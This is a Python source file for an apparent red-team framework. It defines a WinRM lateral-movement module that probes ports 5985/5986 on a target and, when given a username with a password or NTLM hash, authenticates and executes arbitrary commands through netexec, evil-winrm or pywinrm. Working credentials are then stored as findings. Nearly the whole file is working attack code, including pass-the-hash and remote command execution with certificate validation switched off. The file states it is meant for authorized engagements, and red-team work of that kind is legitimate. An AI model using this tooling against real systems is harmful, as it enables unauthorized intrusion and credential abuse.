"""WinRM lateral-movement helper (``lateral.winrm``).

Checks whether Windows Remote Management (WinRM) is exposed on a target and,
when credentials are supplied, attempts to authenticate and optionally execute
a command over it. This is a *lateral movement* aid for AUTHORIZED red-team
engagements only.

Design constraints (redkit invariants honoured here):

* **No AI/LLM, no auto-download.** Everything is deterministic and offline.
* **Pure standard library by default.** The optional :mod:`winrm` (``pywinrm``)
  package is imported lazily inside a ``try/except`` so this module always
  imports and the raw TCP reachability check always works, even with nothing
  else installed.
* **Cross-platform.** Only :mod:`socket` / :mod:`subprocess` (via the shared
  runner) are used; nothing OS-specific runs at import time.
* **Best-effort tool wrapping.** ``netexec``/``nxc`` (or CrackMapExec) is
  preferred, then ``evil-winrm``, then the ``pywinrm`` library. If none are
  present the module still reports reachability and returns actionable guidance
  instead of crashing. No external tool is required to import this module.

WinRM listens on ``5985/tcp`` (HTTP) and ``5986/tcp`` (HTTPS) by default.
"""
from __future__ import annotations

import re
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple

from redkit.core.module import Module, Option, Result
from redkit.core.registry import register

try:  # optional pure-python WinRM client; degrade gracefully if absent
    import winrm as _pywinrm  # type: ignore
    _HAVE_PYWINRM = True
except Exception:  # pragma: no cover - import guard (never require the lib)
    _pywinrm = None  # type: ignore
    _HAVE_PYWINRM = False


# -- constants --------------------------------------------------------------
_WINRM_HTTP = 5985            # default HTTP listener
_WINRM_HTTPS = 5986           # default HTTPS (TLS) listener
_TCP_TIMEOUT = 4.0            # per-port connect timeout (seconds)
_MAX_PORT_THREADS = 8         # capped fan-out for the port check
_AUTH_TIMEOUT = 60            # subprocess timeout for auth-only checks
_EXEC_TIMEOUT = 180           # subprocess timeout when a command is run
_NETEXEC_BINARIES = ("nxc", "netexec", "crackmapexec", "cme")
_EVILWINRM_BINARY = "evil-winrm"


# -- stdlib helpers ---------------------------------------------------------
def _tcp_open(host: str, port: int, timeout: float = _TCP_TIMEOUT) -> bool:
    """Return ``True`` if a TCP connection to ``host:port`` succeeds.

    Uses :func:`socket.create_connection` so both IPv4 and IPv6 targets work.
    Every failure mode (refused, timeout, DNS failure) surfaces as ``OSError``
    and is swallowed into a ``False``.
    """
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


def _safe_name(text: str) -> str:
    """Sanitise a string for use inside an artifact filename."""
    return re.sub(r"[^A-Za-z0-9_.-]", "_", text) or "target"


@register
class WinRMModule(Module):
    """Detect WinRM exposure and authenticate / execute over it.

    Flow:

    1. TCP-check the standard WinRM ports (and any operator-supplied port).
       Reachable ports are persisted with ``add_service(..., "winrm")``.
    2. If no username was given, stop after the connectivity report.
    3. Otherwise attempt authentication (and command execution when a
       ``command`` is set) using the first available backend, preferring
       ``netexec`` -> ``evil-winrm`` -> ``pywinrm``. Pass-the-hash is wired
       through with ``-H`` for the external tools.
    4. On success record a high-severity ``WinRM access`` finding plus the
       working credential.
    """

    name = "lateral.winrm"
    description = "Check WinRM exposure and authenticate/exec over it (netexec/evil-winrm/pywinrm)"
    phase = "lateral"
    options = [
        Option("target", help="Target host or IP running WinRM", required=True),
        Option("username", default="", help="Username to authenticate as"),
        Option("password", default="", help="Cleartext password"),
        Option("hash", default="", help="NTLM hash for pass-the-hash (NT or LM:NT)"),
        Option("domain", default="", help="Domain / workgroup (blank = local account)"),
        Option("port", default=_WINRM_HTTP, help="WinRM port (5985 HTTP / 5986 HTTPS)"),
        Option("command", default="", help="Command to run; empty = auth/connectivity check only"),
    ]
    requires_tools = []  # netexec / evil-winrm / pywinrm are all optional
    references = [
        "https://learn.microsoft.com/windows/win32/winrm/portal",
        "https://www.netexec.wiki/winrm-protocol",
        "https://github.com/Hackplayers/evil-winrm",
    ]

    # -- entry point --------------------------------------------------------
    def run(self, opts, ctx) -> Result:
        target = str(opts["target"]).strip()
        username = str(opts["username"] or "")
        password = str(opts["password"] or "")
        nt_hash = str(opts["hash"] or "").strip()
        domain = str(opts["domain"] or "").strip()
        req_port = int(opts["port"])
        command = str(opts["command"] or "")

        console = ctx.console
        console.banner("lateral.winrm", f"target={target}")

        if not target:
            return Result(ok=False, summary="no target specified")

        # ---- 1. TCP reachability check (always works, pure stdlib) -------
        ports_to_check: List[int] = []
        for p in (req_port, _WINRM_HTTP, _WINRM_HTTPS):
            if p not in ports_to_check:
                ports_to_check.append(p)

        open_ports = self._scan_ports(target, ports_to_check)
        for p in open_ports:
            ctx.engagement.add_service(target, p, "tcp", "winrm")

        data: Dict[str, object] = {
            "target": target,
            "ports_checked": ports_to_check,
            "ports_open": open_ports,
            "authenticated": False,
            "pwned": False,
            "method": None,
            "command": command or None,
        }

        if not open_ports:
            msg = (
                f"WinRM not reachable on {target} "
                f"(checked {', '.join(str(p) for p in ports_to_check)})"
            )
            console.warn(msg)
            return Result(ok=False, summary=msg, data=data)

        console.good(
            f"WinRM reachable on {target}: {', '.join(str(p) for p in open_ports)}"
        )

        use_port, use_ssl = self._choose_port(req_port, open_ports)
        data["port"] = use_port
        data["ssl"] = use_ssl

        # ---- 2. No credentials -> connectivity report only ---------------
        if not username:
            summary = (
                f"WinRM open on {target}:{','.join(str(p) for p in open_ports)}; "
                "no username supplied so no authentication attempted"
            )
            ctx.engagement.add_finding(
                title="WinRM service exposed",
                severity="info",
                host=target,
                description=summary,
            )
            console.info("no username provided -> connectivity check only")
            return Result(ok=True, summary=summary, data=data)

        # ---- 3. Attempt auth / exec via the first available backend ------
        attempts: List[str] = []
        backend: Optional[Dict[str, object]] = None

        nxc_bin = self._find_netexec(ctx)
        if nxc_bin:
            attempts.append("netexec")
            backend = self._try_netexec(
                ctx, nxc_bin, target, use_port, username, password, nt_hash, domain, command
            )

        if backend is None and ctx.runner.have(_EVILWINRM_BINARY):
            attempts.append("evil-winrm")
            backend = self._try_evil_winrm(
                ctx, target, use_port, use_ssl, username, password, nt_hash, domain, command
            )

        if backend is None and _HAVE_PYWINRM:
            if nt_hash and not password:
                console.warn(
                    "pywinrm cannot pass-the-hash; install netexec or evil-winrm to use -H"
                )
            else:
                attempts.append("pywinrm")
                backend = self._try_pywinrm(
                    ctx, target, use_port, use_ssl, username, password, domain, command
                )

        data["attempts"] = attempts

        if backend is None:
            guidance = (
                "WinRM is open but no execution backend is available. Install one of: "
                "netexec (pipx install netexec), evil-winrm (gem install evil-winrm), "
                "or pywinrm (pip install pywinrm)."
            )
            console.warn(guidance)
            ctx.engagement.add_note(f"lateral.winrm: {guidance} ({target})")
            return Result(ok=False, summary=guidance, data=data)

        # ---- 4. Record outcome -------------------------------------------
        method = str(backend["method"])
        authed = bool(backend["authenticated"])
        pwned = bool(backend.get("pwned", authed))
        output = str(backend.get("output", ""))
        data["method"] = method
        data["authenticated"] = authed
        data["pwned"] = pwned
        data["output"] = output[:20000]

        artifacts: List[str] = []
        try:
            art = ctx.artifact_path(f"winrm_{_safe_name(target)}_{use_port}.txt")
            header = (
                f"# lateral.winrm {target}:{use_port} via {method}\n"
                f"# user={self._qualified_user(domain, username)} "
                f"command={command or '(auth check)'}\n\n"
            )
            art.write_text(header + output, encoding="utf-8")
            artifacts.append(str(art))
        except OSError as exc:
            console.warn(f"could not write artifact: {exc}")

        if authed:
            ctx.engagement.add_cred(
                service="winrm",
                host=target,
                username=self._qualified_user(domain, username),
                password=password or None,
                secret_hash=nt_hash or None,
                source="lateral.winrm",
            )
            desc = (
                f"Authenticated to WinRM on {target}:{use_port} as "
                f"{self._qualified_user(domain, username)} via {method}"
                + (" (command executed)" if command else "")
            )
            ctx.engagement.add_finding(
                title="WinRM access",
                severity="high",
                host=target,
                description=desc,
                evidence=(output[:2000] if output else None),
            )
            console.good(desc)
            return Result(ok=True, summary=desc, data=data, artifacts=artifacts)

        summary = (
            f"WinRM open on {target}:{use_port} but authentication failed for "
            f"{self._qualified_user(domain, username)} (via {method})"
        )
        console.bad(summary)
        return Result(ok=False, summary=summary, data=data, artifacts=artifacts)

    # -- helpers ------------------------------------------------------------
    def _scan_ports(self, target: str, ports: List[int]) -> List[int]:
        """Concurrently TCP-check ``ports`` on ``target`` with a capped pool."""
        open_ports: List[int] = []
        workers = max(1, min(_MAX_PORT_THREADS, len(ports)))
        with ThreadPoolExecutor(max_workers=workers) as pool:
            futures = {pool.submit(_tcp_open, target, p): p for p in ports}
            for fut in as_completed(futures):
                port = futures[fut]
                try:
                    if fut.result():
                        open_ports.append(port)
                except Exception:  # pragma: no cover - defensive
                    pass
        return sorted(open_ports)

    @staticmethod
    def _choose_port(req_port: int, open_ports: List[int]) -> Tuple[int, bool]:
        """Pick which open port to talk to and whether TLS is implied.

        Preference: the operator-supplied port, then 5985 (HTTP), then 5986
        (HTTPS), then whatever is open. TLS is used for the 5986 listener.
        """
        if req_port in open_ports:
            chosen = req_port
        elif _WINRM_HTTP in open_ports:
            chosen = _WINRM_HTTP
        elif _WINRM_HTTPS in open_ports:
            chosen = _WINRM_HTTPS
        else:
            chosen = open_ports[0]
        return chosen, chosen == _WINRM_HTTPS

    @staticmethod
    def _qualified_user(domain: str, username: str) -> str:
        """Return ``DOMAIN\\user`` when a domain is set, else the bare user."""
        return f"{domain}\\{username}" if domain else username

    @staticmethod
    def _find_netexec(ctx) -> Optional[str]:
        """Return the first available netexec-family binary, or ``None``."""
        for name in _NETEXEC_BINARIES:
            if ctx.runner.have(name):
                return name
        return None

    def _try_netexec(
        self,
        ctx,
        nxc_bin: str,
        target: str,
        port: int,
        username: str,
        password: str,
        nt_hash: str,
        domain: str,
        command: str,
    ) -> Dict[str, object]:
        """Attempt auth/exec via netexec/CrackMapExec's ``winrm`` protocol.

        netexec derives TLS from the port (5986 => https) so no explicit SSL
        flag is needed. A successful login prints ``[+]`` (and ``(Pwn3d!)``
        when command execution is possible); failures print ``[-]``.
        """
        argv = [nxc_bin, "winrm", target, "-u", username]
        if nt_hash:
            argv += ["-H", nt_hash]
        else:
            argv += ["-p", password]
        if domain:
            argv += ["-d", domain]
        argv += ["--port", str(port)]
        if command:
            argv += ["-x", command]

        proc = ctx.runner.run(argv, timeout=_EXEC_TIMEOUT if command else _AUTH_TIMEOUT)
        if proc.timed_out:
            ctx.console.warn("netexec timed out")
        text = proc.text
        pwned = "Pwn3d!" in text
        authed = pwned or ("[+]" in text)
        return {
            "method": f"netexec ({nxc_bin})",
            "authenticated": authed,
            "pwned": pwned,
            "output": text,
        }

    def _try_evil_winrm(
        self,
        ctx,
        target: str,
        port: int,
        ssl: bool,
        username: str,
        password: str,
        nt_hash: str,
        domain: str,
        command: str,
    ) -> Dict[str, object]:
        """Attempt auth/exec via ``evil-winrm``.

        evil-winrm is an interactive PowerShell remoting shell, so we feed the
        command (if any) followed by ``exit`` over stdin for a one-shot run.
        A working session prints the ``*Evil-WinRM*`` prompt banner; auth
        failures raise ``WinRMAuthorizationError``.
        """
        user_arg = self._qualified_user(domain, username)
        argv = [_EVILWINRM_BINARY, "-i", target, "-u", user_arg]
        if nt_hash:
            argv += ["-H", nt_hash]
        else:
            argv += ["-p", password]
        argv += ["-P", str(port)]
        if ssl:
            argv += ["-S"]

        stdin = (command + "\n" if command else "") + "exit\n"
        proc = ctx.runner.run(
            argv,
            timeout=_EXEC_TIMEOUT if command else _AUTH_TIMEOUT,
            input_data=stdin,
        )
        if proc.timed_out:
            ctx.console.warn("evil-winrm timed out")
        text = proc.text
        auth_error = (
            "WinRMAuthorizationError" in text
            or "AuthenticationError" in text
            or "Access is denied" in text
        )
        authed = ("*Evil-WinRM*" in text) and not auth_error
        return {
            "method": "evil-winrm",
            "authenticated": authed,
            "pwned": authed,
            "output": text,
        }

    def _try_pywinrm(
        self,
        ctx,
        target: str,
        port: int,
        ssl: bool,
        username: str,
        password: str,
        domain: str,
        command: str,
    ) -> Dict[str, object]:
        """Attempt auth/exec via the pure-python ``pywinrm`` library (NTLM).

        Reaching a completed ``run_*`` call without an exception means the NTLM
        authentication succeeded; command exit status does not affect that.
        Pass-the-hash is not supported by this backend and is handled upstream.
        """
        scheme = "https" if ssl else "http"
        endpoint = f"{scheme}://{target}:{port}/wsman"
        user = self._qualified_user(domain, username)
        try:
            session = _pywinrm.Session(
                endpoint,
                auth=(user, password),
                transport="ntlm",
                server_cert_validation="ignore",
            )
            if command:
                shell = session.run_ps(command)
            else:
                shell = session.run_cmd("whoami")
            out = _decode_stream(getattr(shell, "std_out", b""))
            err = _decode_stream(getattr(shell, "std_err", b""))
            if err.strip():
                out += "\n[stderr]\n" + err
            return {
                "method": "pywinrm",
                "authenticated": True,
                "pwned": True,
                "output": out,
            }
        except Exception as exc:  # auth failure / connection error / lib quirk
            ctx.console.debug(f"pywinrm failed: {exc}")
            return {
                "method": "pywinrm",
                "authenticated": False,
                "pwned": False,
                "output": f"pywinrm error: {exc}",
            }


def _decode_stream(raw) -> str:
    """Coerce a pywinrm std_out/std_err value into text."""
    if raw is None:
        return ""
    if isinstance(raw, bytes):
        return raw.decode("utf-8", "replace")
    return str(raw)
